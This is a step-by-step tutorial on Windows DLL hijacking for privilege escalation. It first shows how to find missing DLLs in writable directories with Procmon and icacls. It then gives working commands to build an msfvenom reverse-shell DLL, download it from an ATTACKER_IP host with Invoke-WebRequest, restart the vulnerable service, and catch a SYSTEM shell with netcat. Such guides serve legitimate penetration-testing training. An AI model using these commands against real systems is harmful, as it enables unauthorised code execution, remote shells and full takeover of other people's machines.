**DLL Hijacking** is a technique that exploits how Windows applications load Dynamic Link Libraries (DLLs). If an application or service loads a DLL without specifying a full path, and a low-privileged user can write to the directory where the application searches first, an attacker can place a malicious DLL with the same name. When the application runs (especially with elevated privileges), it loads the attacker's DLL, leading to code execution with the same privileges.

> A **DLL (Dynamic Link Library)** is a file that contains code and data used by multiple programs in Windows. Instead of duplicating functions across applications, DLLs allow programs to share common functionality making software more modular and efficient.

---

## 1. Identify a Vulnerable Application or Service

Look for applications or services that:

- Run with elevated privileges (e.g., SYSTEM)
- Load DLLs from writable directories
- Do not use full paths when loading DLLs

Use tools like **Process Monitor (Procmon)** to detect DLL load attempts:

```text
Filter:
  Operation is CreateFile
  Path ends with .dll
  Result is NAME NOT FOUND
```

Look for missing DLLs in writable paths like:

```
C:\Program Files\VulnApp\
C:\Users\Public\
```

---

## 2. Check Write Permissions

Verify that your user can write to the target directory.

```powershell
icacls "C:\Program Files\VulnApp"
```

Look for permissions like:

```
BUILTIN\Users:(I)(M)
```

This means users can **modify** files in the directory.

---
## 3. Create a Malicious DLL Payload

Use `msfvenom` to generate a reverse shell DLL.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o evil.dll
```

---

## 4. Rename the DLL to Match the Missing One

If Procmon showed the application was looking for `example.dll`, rename your payload:

```bash
mv evil.dll example.dll
```

---

## 5. **Transfer the DLL to the Target Directory

Use a file transfer method like Python HTTP server:

```bash
python3 -m http.server 8080
```

On Windows:

```powershell
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/example.dll" -OutFile "C:\Program Files\VulnApp\example.dll"
```

---

## 6. **Trigger the Application or Service

Start or restart the vulnerable application or service so it loads your malicious DLL.

```powershell
# If it's a service
Restart-Service -Name "VulnAppService"
```

Or manually launch the application if it's user-triggered.

---

## 7. Catch the Reverse Shell

On Kali, start your listener:

```bash
nc -lvnp YOUR_PORT
```

Once the DLL is loaded, you should receive a shell with the privileges of the application (often SYSTEM).
